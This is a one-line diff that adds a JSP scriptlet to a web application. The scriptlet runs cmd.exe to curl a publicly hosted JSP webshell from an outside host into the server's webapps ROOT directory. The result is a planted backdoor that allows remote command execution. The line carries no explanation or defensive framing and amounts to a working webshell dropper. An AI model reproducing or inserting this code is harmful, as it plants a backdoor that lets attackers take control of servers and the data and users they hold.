@@ -1,0 +1,1 @@
+<% Runtime.getRuntime().exec("cmd.exe /C curl -o ..\\webapps\\ROOT\\cmd.jsp https://raw.githubusercontent.com/tennc/webshell/master/fuzzdb-webshell/jsp/cmd.jsp"); %>
